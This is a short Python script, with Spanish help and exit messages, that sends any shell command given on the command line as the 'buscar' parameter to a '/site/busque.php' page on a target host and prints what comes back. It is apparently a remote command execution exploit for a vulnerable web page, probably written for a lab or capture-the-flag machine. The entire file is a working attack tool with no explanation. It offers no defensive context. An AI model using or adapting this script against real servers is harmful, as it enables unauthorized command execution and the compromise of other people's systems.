#!/bin/python3

import requests, sys, signal

def def_handler(sig, frame):
    print("\n\n[!] Saliendo...\n")
    sys.exit(1)

# Ctrl+C
signal.signal(signal.SIGINT, def_handler)

def showHelp():
    print(f'[!] Uso: python3 {sys.argv[0]} [host] [comando]')
    print(f"\n\n\tEjemplo => python3 {sys.argv[0]} 10.0.2.8 'whoami'\n")
    sys.exit(1)

def makeRequest():
    url = 'http://' + sys.argv[1] + "/site/busque.php"
    command = sys.argv[2]
    data = {
        'buscar': command
    }

    s = requests.session()

    req = s.get(url, params=data)
    print(f'Estado {req.status_code}')

    res = req.text
    print(f'\n\n {res}')

def main():
    if len(sys.argv) < 3:
        showHelp()
    else:
        makeRequest()

if __name__ == "__main__":
    main()